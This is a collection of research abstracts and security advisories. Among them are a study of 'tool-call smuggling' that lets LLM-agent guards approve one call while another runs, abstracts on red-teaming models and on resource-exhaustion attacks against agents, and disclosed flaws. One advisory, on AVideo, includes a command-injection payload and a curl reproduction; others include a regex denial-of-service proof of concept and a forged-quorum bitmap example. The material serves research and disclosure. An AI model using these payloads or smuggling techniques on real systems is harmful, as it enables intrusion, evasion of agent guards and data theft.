items.summary: LLM agents act through tool calls: the model writes the arguments of a call as JSON, a guard decides whether the call may run, and an executor runs it. The same bytes are parsed several times, by the provider, gateways, SDKs, frameworks, the guard, and the executor. JSON leaves some choices to each parser, such as which copy of a repeated key counts. When the guard and the executor choose differently, the guard approves one call, the executor runs another, and the audit log records the approved one. We introduce this attack, tool-call smuggling, and study it across the stack. We describe six ways in which the same bytes yield different calls and build a differential testing harness that gives identical bytes to 17 pinned parser and validator configurations; most pairs disagree on some inputs, and even two official MCP SDKs accept different inputs. On tasks from $τ$-bench and AgentDojo, an attacker who can rewrite the bytes in transit cancels another customer's reservation and creates a file that the guard blocks by name, while the audit log names only the approved call. Content the model reads splits guard and executor only inside a string: ten models we test write no repeated or disguised key into the call itself where we see it, but copy one verbatim into JSON text in an argument, which a Python guard and a Go executor read differently. A malicious server copying a legitimate tool's public schema and adding one field, which a note explains, gets the model to fill it, unseen by the guard, with user data. Parsing each call once, JSON text included, keeping only the fields of the approved schema, and handing it to the executor, sealed with its call ID in transit, stops all 7,412 crafted inputs and every attack we built.
items.title: Oops!... I Parsed It Again: Tool-Call Smuggling Against LLM Agents

items.summary: As large language models (LLMs) evolve from text generation to autonomous software-engineering execution, automated vulnerability exploitability verification has emerged as a vital frontier in software quality assurance and security validation. Existing security benchmarks, however, largely judge models by binary pass/fail outcomes or coarse stage milestones. Such outcome-centric scoring obscures fine-grained failure dynamics across long-horizon execution and conflates the intrinsic capability of a base LLM with external agent scaffolding. We present POMA (Pwn-Oriented Model Assessment), a process-level evaluation methodology and platform that isolates base LLMs under a unified execution baseline -- fixing task inputs, tool interfaces, target environments, feedback formats, and execution budgets -- while measuring intermediate states and transitions from runtime evidence. Evaluating four frontier base LLMs across 55 CTF Pwn challenges and 10 real-world vulnerability reproduction tasks exposes persistent capability attrition along the exploitation chain: from vulnerability knowledge to executable implementation, from client-side actions to verified target states, from failure localization to precise repair, and across iterative revisions. In real-world software, models further struggle to satisfy format, semantic, differential, and crash-identity constraints simultaneously. By pinpointing where execution chains break down, POMA provides an empirical foundation for trustworthy capability assessment and principled vulnerability-agent design. Our benchmark catalogs, process-measurement evaluator, and sample harness are publicly available at https://github.com/maple-pwn/poma-release .
items.title: POMA: Beyond Final Flags -- Process-Level Evaluation of Base LLMs in Vulnerability Exploitation

items.summary: Permissioned-ledger cross-domain data sharing needs anonymity and accountability: an endorsement hides its author, but a regulator must identify it on authorization reuse. Existing lattice-based schemes give these only separately: public traceability exposes signers to collision detectors; linkable non-tracing schemes cannot open; threshold schemes solve another problem. None gives post-quantum security, a signer-chosen ring, a publicly comparable per-event tag, and one-authority opening together. We propose \textsf{PLATRS}, a module-lattice linkable accountable ring signature for permissioned blockchains. Consortium-CA enrollment binds the key returned by an opening to a registered identity. The signer chooses the ring; verification is index-free; each signature has a per-event tag any verifier can compare. Tag noise derives from the signer's tracing secret and event, so linking is one comparison for honest signatures while the tag remains M-LWE without the secret. Detection is two-tier: tag mismatch is immediate; different tags on two accepted signatures for one event trigger an opening; the authority publishes the recovered public opening component, and any member recomputes the verdict against the ring. We prove CPA anonymity from M-LWE, linkability, authority-only traceability, and unforgeability from M-SIS with M-LWE in the random oracle model. At \(N=1024\), our open-source implementation: sign 9.886~ms, verify 3.919~ms, link 0.7~\(μ\)s, open 480~\(μ\)s; signature 107.3~KiB (log in ring size); adjudication 4.867~ms. Hyperledger Fabric: 60.5 signature submissions/s at 7.87~MB/s with 16~MiB blocks, commit-bandwidth limited. Common-harness: fastest of 5 schemes to sign/verify, second in size; vs FLLL\(^+\)21, signing is 3188\(\times\) faster and signatures 133\(\times\) shorter.
items.title: PLATRS: A Lattice-Based Linkable Accountable Ring Signature for Permissioned Blockchains

items.summary: Tool-augmented Large Language Model (LLM) agents are vulnerable to resource-exhaustion attacks that amplify model-token consumption through persistent context amplification, large tool output amplification, and error-induced agentic loops. Despite growing attention to agent security and resource-abuse risks, a systematic defense framework specifically targeting these attacks remains lacking. Meanwhile, existing general-purpose agent defense frameworks, which address a broader range of security threats, often rely on prompt-level safeguards or coarse-grained resource limits and lack deterministic runtime mechanisms for controlling token consumption. They also provide limited support for balancing fault recovery against the risk of repeated resource-consuming execution. To address these limitations, we propose a trust-anchored closed-loop defense framework consisting of four phases: certificate-guided orchestration with deterministic handoffs, calibrated one-time node budgeting, Gateway-based runtime enforcement, and bounded recovery through a shared, non-resettable recovery pool. By accounting for both input and output tokens across all model invocations, our experiments demonstrate that the framework bounds cumulative token consumption, mitigates resource-amplification attacks, and preserves benign task utility under trusted execution assumptions.
items.title: Bounded Autonomy: A Trust-Anchored Defense Against Resource-Exhaustion Attacks on Tool-Augmented LLM Agents

items.summary: Staff pseudonymizing financial data in closed networks must interpret abbreviated column names, identify personal information, and choose processing methods. Local language models can assist, but may give different labels for the same input. PseuDRAGON keeps confirmed judgments and corrections outside a fixed model and reuses them through exact-name lookup and learned rules. For expert review, the workflow searches institutional policy, national privacy law, then international sources. Across 92 columns from one institution, rules increase reuse under the same approval checks from 75 to 83 labels without reuse errors when all training judgments are available. With 25% of the training judgments, withholding non-PII rules for unseen names eliminated the extra PII misses in replay at the cost of lower reuse. Revising or withdrawing approvals rebuilds derived rules, and tests on synthetic records verify that selected methods produce the specified outputs. In three paired runs, the history-first baseline cut automated identification time by 83.0% on average versus no reuse.

items.summary: Reliable video deepfake detection requires generalization to unseen generators while limiting false alarms on authentic footage. Although existing detectors capture diverse visual cues, they may produce overconfident errors under generator shift, limiting the reliability of confidence-based fusion. Threshold calibration is further complicated by shifts in authentic capture domains and the lack of future-generator examples. To address these challenges, we present Antiphony, a framework that combines calibrated fusion of four visual experts with selective investigation. Authentic videos serve as a shared reference for score fusion and threshold calibration, enabling threshold updates without target deepfakes. For this expert-fusion stage, we establish finite-sample false-alarm control when the scoring procedure is fixed independently of calibration and authentic samples are exchangeable. To refine decisions near the calibrated threshold, a tool-using multimodal investigator examines these videos and contributes an additional fusion score. We train the investigator on generator-held-out predictions and counterfactual expert outputs, to improve robustness to unreliable expert evidence. Across six benchmark protocols, Antiphony achieves a mean benchmark score of 88.3%, exceeding the strongest evaluated MLLM and conventional detector baselines by 14.7 and 11.5 points, respectively. It also outperforms ARGUS by 20.2 points on average and by 3.6 balanced-accuracy points on FaceVid's 20 unseen generators.
items.title: Antiphony: A Dual-Process Agent for Deepfake Video Detection with Real-Video Calibration

items.summary: Reinforcement learning can increase the success of automated red teaming but it also narrows the attack vector. This study asks where in the attacker-defender-judge learning loop does the narrowing begin and which mechanisms lead to a narrowing attack. Six mechanisms (defender adaptation, success edge, reward reinforcement, row cap, update size, and measurement) are tested across three experiment arms (co-trained, frozen defender, half learning rate) for twenty-four iterations. A frozen defender narrows attack diversity retention (ADR) earlier 0.496 relative to co-trained 0.891 at iteration twelve. Defender updates delay narrowing but dont prevent it. Successful attacks ("winners") have narrower attack diversity than the full set of generated attacks. Attacks closest to previous winners succeed 10-15 percentage points more often than those closest to previous failures. This winner-neighbor advantage holds after a defender update and for a fixed defender too. Attacks with a common opening have a common-opening advantage of 5-16 percentage points. The training row cap and update size account for little impact on ADR, and attack length accounts for only part of the ADR decrease. Narrowing appears to originate from the success only reward through the group-relative training advantage to the attacker update, with a persistent success edge setting the direction.

items.summary: System provenance graphs help reconstruct attacks through causal dependencies, but these connections alone do not explain how events accomplish an adversary's goal. Cyber threat intelligence (CTI) provides the necessary security knowledge, yet linking it to execution evidence requires bridging differences in meaning and granularity between events and attack relations amid scarce labels and sparse relevant evidence. We present LODESTONE, a cross-graph alignment system that links observed system events to CTI attack relations to support evidence-grounded attack reports. LODESTONE uses a novel CTI-driven training-data engine and an expert-verified benchmark of edge-level correspondences and reference attack reports. The engine pairs real CTI knowledge graphs with provenance graphs from isolated executions. A large language model (LLM) agent recursively improves correspondences by checking execution evidence and repairing retrieval, parsing, and reproduction failures; experts independently verify benchmark correspondences. LODESTONE combines text cross-encoder and directed-graph relevance scores to extract compact alert-centered subgraphs, retrieves article-level knowledge graphs through node- and edge-level dual-softmax assignment, and uses a fine-tuned 4B-parameter LLM to align event combinations with CTI attack steps. We evaluate LODESTONE on 27 expert-verified attack cases amid continuous benign activity from real applications, using 713 CTI articles. LLM judgments aligned with multiple human experts yield an attack-step description score of 82%, and attack identification reaches 91%, versus 73% and 32% using the same generator with provenance alone. Baseline pipelines and coding agents achieve description scores of at most 57%. Human-verified correspondences further demonstrate advantages in balancing attack-edge coverage with subgraph size, CTI retrieval, and cross-graph alignment.

items.summary: Zero-knowledge virtual machines (zkVMs) prove correct execution of programs and underpin systems securing billions of dollars in digital assets. Their security depends on alignment between the instruction set architecture (ISA) that programs target, such as RISC-V, and the constraint system, polynomial equations that check the prover's record of every intermediate value (the witness). Mismatches, or semantic gaps, come in two kinds: underconstraint bugs let a malicious prover forge a proof of an execution the ISA forbids (a soundness violation), and divergence bugs make the zkVM itself deviate from the ISA or crash, so an honest prover cannot prove a legitimate execution (a completeness violation). Both cluster at corner cases such as division by zero that conventional fuzzing almost never reaches, and underconstraint bugs leave program output unchanged. Our key insight is that these corner cases correspond to constraint obligations derived from the ISA specification and the proof system's algebraic structure. We build Beak, a reinforcement-learning fuzzer in which obligations replace three random decisions: they supply inputs that trigger each obligation, reward executions that trigger new combinations of obligations, and direct witness tampering to the step where an obligation is triggered. Beak flags divergence bugs by comparing registers against a reference RISC-V emulator, and underconstraint bugs by checking whether the constraints accept a tampered witness. On six leading production RISC-V zkVMs, Beak detects 25 of 37 known bugs (67.6%) versus 5 (13.5%) for the prior state of the art, and discovers 14 previously unknown bugs, all responsibly disclosed and patched.
items.title: Revealing Semantic Gaps in Zero-Knowledge Virtual Machines via Obligation-Targeted Semantic Fuzzing

items.summary: Zero-knowledge proofs can show that a neural network produced a given output without revealing the network, but current systems for language models prove integer approximations of the model rather than the floating-point arithmetic that is actually deployed. Proving floating-point matrix multiplication has been regarded as hard, because rounding after every addition makes the result depend on the order of the additions. We avoid this obstacle by proving the correctly rounded product, in which every dot product is computed exactly and rounded once. This result is independent of the hardware and at least as accurate as standard kernels. We give an interactive proof for this relation whose cost is close to that of integer matrix multiplication, with roughly a thousand times fewer committed values than per-operation floating-point circuits need constraints, extend it to every layer of a transformer, and give a privacy construction for the complete argument whose zero knowledge we prove under explicit hypotheses. We implement the system and prove the full forward pass of GPT-2 small, including all twelve blocks and the output over the whole vocabulary, in 19 minutes on two processor cores; verification takes 21 seconds. The verifier rejects all 236 attacks we tested, and the model's outputs agree with high-precision inference at least as closely as standard 16-bit inference does.
items.title: Ziv Meets Sumcheck: Zero-Knowledge Proofs of Floating-Point LLM Inference

items.summary: In the contemporary artificial intelligence ecosystem, foundation models are increasingly deployed under AI-as-a-Service (AIaaS) schemes characterized by high technical opacity, technological concentration, and limited external auditing capability over governance, training, and internal operational processes. Under these conditions, traditional ethical oversight approaches that focus exclusively on corporate governance or on internal model inspection become insufficient to ensure effective control over AI systems deployed in real-world contexts. This work proposes a pragmatic operational assurance framework inspired by Zero-Trust principles from cybersecurity, which shifts effective auditing efforts toward the application layer, where risk acquires observable, contextualized, and operationally verifiable properties. The proposal articulates two complementary evaluation levels: a black-box evaluation aimed at characterizing general behaviors, vulnerabilities, and risky capabilities of foundation models through conversational scanning, and a grey-box evaluation focused on the operational contextualization of risk within the actual deployment environment of the audited application. The framework incorporates mechanisms to move from general, CVSS-inspired severity metrics toward contextualized operational risk assessments that take into account user profiles, industrial domains, and organizational knowledge. In addition, the proposal strengthens practical auditability through digitally signed explainability reports (signed XAI reports), designed to support verifiable traceability, continuous monitoring, and operational accountability in LLM-based sociotechnical systems.
items.title: Operational Assurance for LLM-Based Systems under Governance Opacity

items.summary:
### Summary

The helper `listFFmpegProcesses($keyword)` in `plugin/API/standAlone/functions.php` builds a shell pipeline by interpolating `$keyword` inside single quotes and running it with `exec()`:

```php
$command .= " | grep '$keyword'";
exec($command, $output, $status);
```

The two callers in `plugin/API/standAlone/ffmpeg.json.php` (the `list` mode and the `isKeywordRunning` mode) pass the RAW decrypted `codeToExec` field, not the sanitized `$keyword` variable that the endpoint allowlists elsewhere. Because the value is placed inside a single-quoted shell context with no escaping, a payload that closes the quote (for example `x'; touch /tmp/marker #`) breaks out and injects an arbitrary command that runs via `exec()`'s `/bin/sh -c`. An attacker who can craft a valid encrypted payload achieves OS command execution as the web-server user.

### Vulnerable code

Sink — `plugin/API/standAlone/functions.php`, `listFFmpegProcesses()` (around lines 139-147):

```php
function listFFmpegProcesses($keyword = '')
{
    $command = "ps -eo pid,etime,%cpu,%mem,cmd | grep '[f]fmpeg'";

    if (!empty($keyword)) {
        $command .= " | grep '$keyword'";   // $keyword interpolated inside single quotes, unescaped
    }

    exec($command, $output, $status);       // runs via /bin/sh -c
```

Callers — `plugin/API/standAlone/ffmpeg.json.php` pass the RAW decrypted field, bypassing the allowlisting applied to the local `$keyword` variable. That local variable is built at line ~136 as `$keyword = preg_replace('/[^a-zA-Z0-9_-]/', '', $codeToExec->keyword)`, but the two callers below never use it:

```php
// list mode (line ~221)
$list = listFFmpegProcesses($codeToExec->keyword);

// isKeywordRunning mode (line ~341)
$list = listFFmpegProcesses($codeToExec->isKeywordRunning);
```

Neither mode is gated by the `$isStandAlone` check that guards the `deleteFolder` / `deleteFile` modes, so both run on any AVideo instance.

### Reachability

Reached by sending a `codeToExec` payload with either `list = 1` and a malicious `keyword`, or with a malicious `isKeywordRunning` value. Both modes call `listFFmpegProcesses()` with the raw field before any allowlist is applied to it.

### Privilege required

Same trust boundary as the parent command-injection fix in this endpoint: an attacker who can craft a valid encrypted `codeToExec` payload with a valid `APISecret`. `_decryptString()` calls the platform `decryptString` API (AES-256-CBC; key = `hash('sha256', $global['saltV2'])`, iv = `substr(hash('sha256', $global['systemRootPath']), 0, 16)`), and the payload is accepted when `payload->time` is within the last 30 seconds. No interactive login is required.

### Reproduction (end-to-end, against master HEAD)

Deployed the master HEAD source (commit `8eaca9d5`, dated 2026-06-30) in a PHP 8.2 / Apache container backed by MySQL 8.0, ran the genuine platform installer, enabled the API plugin, and confirmed the `decryptString` / `isAPISecretValid` platform APIs live over HTTP. `APISecret` is `md5($global['salt'] . $global['systemRootPath'] . 'API')`.

A `codeToExec` was encrypted (`encryptString()`) with:
- `time` = now
- `list` = 1
- `keyword` = `x'; touch /tmp/avideo_kw_rce_1782909694_20509 #`

POST:

```
curl -s -X POST "http://<host>/plugin/API/standAlone/ffmpeg.json.php" \
  --data-urlencode "APISecret=<APISecret>" \
  --data-urlencode "codeToExecEncrypted=<encrypted codeToExec>"
```

Verbatim response (normal list output while the injection ran as a side effect):

```
{"error":false,"msg":"","list":[]}
```

The injected `touch` ran (marker created by the web-server user):

```
-rw-r--r-- 1 www-data www-data 0 Jul  1 12:41 /tmp/avideo_kw_rce_1782909694_20509
```

Same result through the `isKeywordRunning` mode (payload `x'; touch /tmp/avideo_ikr_rce_1782909715_3303 #`):

```
{"error":true,"msg":"No FFmpeg process found with the given keyword","isRunning":false,"keyword":"x'; touch /tmp/avideo_ikr_rce_1782909715_3303 #"}
-rw-r--r-- 1 www-data www-data 0 Jul

items.summary:
### Summary

The JLine3 built-in `less` pager compiles user-supplied search patterns directly as
Java regular expressions with no sanitization, timeout, or backtracking bound. A
malicious pattern such as `(a+)+b` can trigger catastrophic backtracking and hang the
session thread at 100% CPU. In deployments that expose `less` over Telnet or SSH,
this becomes a denial-of-service issue for the affected session and can be used to
exhaust a bounded session pool.

### Details

`Less.getPattern()` in `builtins/src/main/java/org/jline/builtins/Less.java` compiles
the user-controlled search string directly with `Pattern.compile()`:

```java
private Pattern getPattern(boolean doDisplayPattern) {
    Pattern compiled = null;
    String _pattern = doDisplayPattern ? displayPattern : pattern;
    if (_pattern != null) {
        boolean insensitive =
                ignoreCaseAlways || ignoreCaseCond && _pattern.toLowerCase().equals(_pattern);
        compiled = Pattern.compile(
                "(" + _pattern + ")", insensitive ? Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE : 0);
    }
    return compiled;
}
```

The resulting pattern is then applied repeatedly against file content with
`compiled.matcher(line).find()` in the `less` search path. Because Java's
`java.util.regex` engine is backtracking-based and has no built-in timeout, patterns
with nested quantifiers can take exponential time on non-matching input.

Affected source locations:
- `builtins/src/main/java/org/jline/builtins/Less.java`
- `getPattern(boolean doDisplayPattern)`
- search callers using `compiled.matcher(line).find()`

### PoC

1. Create a file with a long run of `a` characters:

```sh
printf 'aaaaaaaaaaaaaaaaaaaaaaaaa\n' > /tmp/testfile.txt
```

2. Open the file with the JLine3 `less` viewer.
3. Press `/` to enter search mode.
4. Enter the pattern `(a+)+b` and press Enter.

Expected result:
- The `less` session stops responding.
- The session thread consumes high CPU.

Variation:
- The same behavior can be triggered through the display-filter path using `&` because
  that path also compiles user input as a raw Java regex.

Reproduction environment:
- JLine3 on x86_64 Linux
- OpenJDK 25.0.2

### Impact

This is a denial-of-service vulnerability caused by catastrophic regex backtracking.
Any application embedding `org.jline:jline-builtins` and exposing the `less` viewer
is impacted. In local use, the affected user can hang their own session. In multi-user
Telnet or SSH deployments, one attacker can occupy one session thread indefinitely and
multiple attackers or sessions can exhaust the server's available worker pool.

### Suggested Fix

The preferred fix for the current git head is to move user-controlled regex matching
to a linear-time engine such as RE2/J.

Suggested patch:

```diff
diff --git a/builtins/pom.xml b/builtins/pom.xml
--- a/builtins/pom.xml
+++ b/builtins/pom.xml
@@
         <dependency>
+            <groupId>com.google.re2j</groupId>
+            <artifactId>re2j</artifactId>
+            <version>1.8</version>
+        </dependency>
+        <dependency>
             <groupId>org.jline</groupId>
             <artifactId>jline-reader</artifactId>
         </dependency>

diff --git a/builtins/src/main/java/org/jline/builtins/Less.java b/builtins/src/main/java/org/jline/builtins/Less.java
--- a/builtins/src/main/java/org/jline/builtins/Less.java
+++ b/builtins/src/main/java/org/jline/builtins/Less.java
@@
-import java.util.regex.Pattern;
+import com.google.re2j.Pattern;
@@
         if (_pattern != null) {
             boolean insensitive =
                     ignoreCaseAlways || ignoreCaseCond && _pattern.toLowerCase().equals(_pattern);
             compiled = Pattern.compile(
                     "(" + _pattern + ")",
                     insensitive ? Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE : 0);
         }
```

If introducing RE2/J is not acceptable, a weaker fallback is to perform regex matching
in a worker with a strict timeout and reject

items.summary:
## Summary

When validating an incoming block header, `HeaderSigVerifier.verifyConsensusSize` counts *every* set bit in `PubKeysBitmap` — including bits that correspond to no validator (the padding bits of the final byte, which exist whenever the consensus group size is not a multiple of 8). The subsequent BLS aggregate-signature verification (`blsMultiSigner.Verify`) only checks signature validity for real validator indices and silently ignores those padding bits. As a result, a malicious or compromised block producer can set the padding bits to make the on-bits reach the PBFT quorum while only gathering a smaller number of real validator signature shares, causing a block to be accepted as correctly signed without a genuine two-thirds validator quorum.

## Details

Quorum counter counts padding bits — `core/process/headerCheck/headerSignatureVerify.go:145-183`:

```go
func (hsv *HeaderSigVerifier) verifyConsensusSize(consensusPubKeys []string, header data.HeaderHandler) error {
	consensusSize := len(consensusPubKeys)
	bitmap := header.GetPubKeysBitmap()

	expectedBitmapSize := consensusSize / 8
	if consensusSize%8 != 0 {
		expectedBitmapSize++
	}
	if len(bitmap) != expectedBitmapSize {
		...
		return ErrWrongSizeBitmap
	}

	numOfOnesInBitmap := 0
	for index := range bitmap {
		numOfOnesInBitmap += bits.OnesCount8(bitmap[index])   // <-- counts ALL bits incl. padding
	}

	minNumRequiredSignatures := consensus.GetPBFTThreshold(consensusSize)
	...
	if numOfOnesInBitmap >= minNumRequiredSignatures {
		return nil
	}
	...
	return ErrNotEnoughSignatures
}
```

The bitmap-byte-length check above only ensures the byte array is the right *size*; it never requires the padding bits (bits `[consensusSize … expectedBitmapSize*8)`) to be zero. So any combination of padding bits is accepted toward the quorum.

`VerifySignature` (`:92-143`) then builds the verifier from the *real* public keys, sets the aggregate signature, and calls `verifier.Verify(hash, bitmap)`.

The BLS verifier ignores padding bits — `crypto/signing/multisig/blsMultisig.go:272-297`:

```go
func (bms *blsMultiSigner) Verify(message []byte, bitmap []byte) error {
	...
	maxFlags := len(bitmap) * 8
	flagsMismatch := maxFlags < len(bms.data.pubKeys)   // only rejects *too few* bytes
	if flagsMismatch {
		return crypto.ErrBitmapMismatch
	}

	pubKeys := make([]crypto.PublicKey, 0)
	for i := range bms.data.pubKeys {                    // <-- only real validator indices
		err := bms.isIndexInBitmap(uint16(i), bitmap)
		if err != nil {
			continue
		}
		pubKeys = append(pubKeys, bms.data.pubKeys[i])
	}

	return bms.llSigner.VerifyAggregatedSig(bms.keyGen.Suite(), pubKeys, bms.data.aggSig, message)
}
```

Because the loop only walks `range bms.data.pubKeys`, a bit set at position `i >= len(pubKeys)` is never inspected by `isIndexInBitmap` and is therefore silently dropped from signature verification, even though `verifyConsensusSize` already counted it toward quorum.

PBFT threshold — `core/consensus/consensus.go:5-8` (`consensusSize*2/3 + 1`) and fallback `:10-13` (`consensusSize/2 + 1`).

Reachable from received blocks — `core/process/block/interceptedBlocks/interceptedBlock.go:181-201` runs `CheckValidity()` → `VerifySignature` on every header received from peers.

### Worked example (consensus size = 5)

- Required PBFT quorum: `5*2/3 + 1 = 4`.
- Valid validator bit positions: 0..4. Bits 5, 6, 7 are padding (no validator).
- Attacker gathers only **one** real signature share (validator 0) and aggregates it.
- Sets bitmap byte to `0b1110_0001` (`0xE1`): bit 0 (real) + bits 5, 6, 7 (padding).
- `verifyConsensusSize` sees `bits.OnesCount8(0xE1) = 4` ≥ 4 → passes quorum.
- `blsMultiSigner.Verify` only validates against validator 0's public key (padding ignored) → passes.
- The block is accepted with one real signer instead of four.

items.summary:
### Impact

When resolving dependencies, Gradle searches repositories in declaration order. If it encounters connection errors, Gradle will disable the repository and fail dependency resolution. This is necessary for both reproducibility and security reasons to prevent dependencies from being resolved from other repositories without warning. 

In previous versions of Gradle, some exceptions were not treated as fatal errors and would not cause a repository to be disabled. If a build encountered one of these exceptions, Gradle would continue to the next repository in the list and potentially resolve dependencies from a different repository. 

#### Vulnerability caused by continuing after max retries on transient errors

An exception like [`NoHttpResponseException`](https://hc.apache.org/httpclient-legacy/exception-handling.html#org_apache_commons_httpclient_NoHttpResponseException) can indicate transient errors. If the errors persist after a maximum number of retries, Gradle would continue to the next repository. 

This behavior could allow an attacker to disrupt the service of a repository and leverage another repository to serve malicious artifacts. This attack requires the attacker to have control over a repository after the disrupted repository.

### Patches

Gradle has introduced a change in behavior in Gradle 9.3.0 and 8.14.4 to stop searching other repositories when encountering these errors. 

Upgrading to either version will protect you against the vulnerabilities described here.

### Workarounds

If you are using strict [repository content filtering](https://docs.gradle.org/9.3.0/userguide/filtering_repository_content.html#header) and / or [dependency verification](https://docs.gradle.org/9.3.0/userguide/dependency_verification.html), your build is safe from the potential vulnerabilities described above.

If you cannot update to a newer Gradle version, configuring [dependency verification](https://docs.gradle.org/9.3.0/userguide/dependency_verification.html) is the best way to make sure your build resolves the dependencies you expect and nothing else.

You should also review which repositories your builds use to check for unused or outdated repository declarations. 

### Related
* [Security feature of failing fast on bad repos does not seem to be implemented](https://github.com/gradle/gradle/issues/35927)
* [Repository disabling](https://docs.gradle.org/current/userguide/graph_resolution.html#sec:repository-disabling)
* [Advisory about repositories with unknown host](https://github.com/gradle/gradle/security/advisories/GHSA-w78c-w6vf-rw82)

items.summary:
### Impact

When resolving dependencies, Gradle searches repositories in declaration order. If it encounters connection errors, Gradle will disable the repository and fail dependency resolution. This is necessary for both reproducibility and security reasons to prevent dependencies from being resolved from other repositories without warning. 

In previous versions of Gradle, some exceptions were not treated as fatal errors and would not cause a repository to be disabled. If a build encountered one of these exceptions, Gradle would continue to the next repository in the list and potentially resolve dependencies from a different repository. 

#### Vulnerability caused by unresolvable host names

[`UnknownHostException`](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/net/UnknownHostException.html) are caused when a host name cannot be resolved to an IP address. This can be caused by DNS misconfiguration, host name typos or any problem that prevents host name resolution. 

If a Gradle build used an unresolvable host name, Gradle would continue to work as long as all dependencies could be resolved from another repository. An unresolvable host name could be caused by allowing a repository's domain name registration to lapse or typo-ing the real domain name. 

This behavior could allow an attacker to register a service under the host name used by the build and serve malicious artifacts. The attack requires the repository to be listed before others in the build configuration. 

### Patches

Gradle has introduced a change in behavior in Gradle 9.3.0 and 8.14.4 to stop searching other repositories when encountering these errors. 

Upgrading to either version will protect you against the vulnerabilities described here.

### Workarounds

If you are using strict [repository content filtering](https://docs.gradle.org/9.3.0/userguide/filtering_repository_content.html#header) and / or [dependency verification](https://docs.gradle.org/9.3.0/userguide/dependency_verification.html), your build is safe from the potential vulnerabilities described above.

If you cannot update to a newer Gradle version, configuring [dependency verification](https://docs.gradle.org/9.3.0/userguide/dependency_verification.html) is the best way to make sure your build resolves the dependencies you expect and nothing else.

You should also review which repositories your builds use to check for unused or outdated repository declarations. 

### Related
* [Security feature of failing fast on bad repos does not seem to be implemented](https://github.com/gradle/gradle/issues/35927)
* [Repository disabling](https://docs.gradle.org/current/userguide/graph_resolution.html#sec:repository-disabling)
* [Advisory about repositories failing to answer](https://github.com/gradle/gradle/security/advisories/GHSA-mqwm-5m85-gmcv)

items.summary:
Improper Verification of Cryptographic Signature in ueberauth guardian allows an unauthenticated attacker to revoke a victim's session with a forged token.

Guardian.revoke/3 in lib/guardian.ex decodes the supplied token with peek/1, which performs no signature verification (it only base64-decodes the JWT header and payload). The resulting unverified claims are forwarded directly to the configured token module's revoke callback and the implementation's on_revoke callback, a state-mutating sink. The sibling operations refresh/2 and exchange/4 both call decode_and_verify first, so the signature is checked before anything acts on the claims; revoke/3 is the only state-mutating path that acts on claims without verifying the signature.

An attacker who knows or guesses a victim's identifying claim values (jti, sub) can forge a JWT carrying those claims, sign it with an arbitrary key, and submit it to any endpoint that funnels a caller-supplied token into Guardian.revoke/3 (the standard logout / session-revocation pattern). When the token module mutates state keyed by the claims (whitelist deletion or blacklist insertion, for example a GuardianDb-style store), the victim's legitimate session is evicted. This is an unauthenticated session-revocation denial of service; the attacker never needs the signing secret.

This issue affects guardian: from 1.0.0-beta.0 before 2.4.1.

items.summary:
Inefficient algorithmic complexity in Plug's nested-parameter decoder allows an unauthenticated remote attacker to cause denial of service. Plug.Conn.Query.decode/4 (and Plug.Conn.Query.decode_each/2) parse query strings and application/x-www-form-urlencoded request bodies. When a key contains many bracketed segments such as a[a][a][a]=1, the decoder walks the brackets and, for each of the N levels, performs a map operation keyed on an ever-growing binary prefix of the key, hashing the full byte range at each step. The total decode cost is therefore quadratic in the number of nesting levels.

With the default Plug.Parsers.URLENCODED body limit of 1,000,000 bytes, a single request can carry roughly 333,000 nesting levels and saturate a BEAM scheduler for minutes. A small number of concurrent requests can saturate all schedulers and render a Plug-based server unresponsive. No authentication or knowledge of application routes is required.

This vulnerability is associated with program files lib/plug/conn/query.ex and program routines Plug.Conn.Query.decode/4, Plug.Conn.Query.decode_each/2, Plug.Conn.Query.split_keys/6, Plug.Conn.Query.insert_keys/3, and Plug.Conn.Query.finalize_pointer/2.

This issue affects plug: from 1.15.0 before 1.15.5, from 1.16.0 before 1.16.4, from 1.17.0 before 1.17.2, from 1.18.0 before 1.18.3, and from 1.19.0 before 1.19.3.

items.summary: We study how to represent and randomize points in $d$-dimensional Euclidean space to obtain accurate bipartite matchings under metric privacy. Given $n$ private and $n$ public points, we analyze local mechanisms that randomize each private point or its distances to the public points. Using the public points' affine span, we construct a smaller representation that preserves all matching costs. When a trusted server receives the private points, we establish privacy and utility guarantees for Gumbel matching, which randomizes edge costs and releases only the assignment. Through upper bounds and worst-case constructions, we establish the tight rate $Θ\!\left(n\min\{d,\log n\}/\varepsilon\right)$ for expected cost above the nonprivate optimum. Benchmark experiments support $d\approx\log n$ as a practical guide to the transition between directly randomizing point coordinates and using Gumbel matching. Extensions to squared Euclidean costs enable private nonparametric two-sample hypothesis testing. These results show how the application's trust model guides representation and dimension choices for better utility: under local privacy, low-dimensional point representations reduce excess cost, while under central privacy, distance representations achieve the optimal rate even in high dimension.

This paper shows that for a hardware-assisted signer the cost that matters is not the arithmetic but the number of times the processor crosses into the fabric, and that the boundary which minimizes those crossings is also where the key can be sealed. A gem5-supported analysis of three control granularities over the same kernels shows that only one job per signature, with the whole rejection loop on chip, takes the processor off the critical path. WEPWAWET-CORE realizes that boundary on an XCZU3EG at 300 MHz: a ROM microsequencer runs Sign, Verify, and key generation as three programs over one datapath and a banked scratchpad, and keeps the key, the on-die entropy, and the mask seed off the processor bus. The processor-side cost of a signature falls from over a second under per-kernel control to 0.53 ms, fixed whatever the number of rejections, and the fabric's time per attempt varies by less than 0.1% under a saturating workload. Under NASA JPL's F Prime with attitude-control and imaging loads, two nodes with fabric-generated, ground-certified keys exchanged 3,575 signed frames, every frame was accepted, and no attitude deadline was missed. A cycle profile places the remaining distance to dedicated cores in two serial units.
items.title: WEPWAWET-CORE: A Hardware-Resident ML-DSA Architecture with Fabric-Generated, Fabric-Sealed Keys for Post-Quantum Avionics

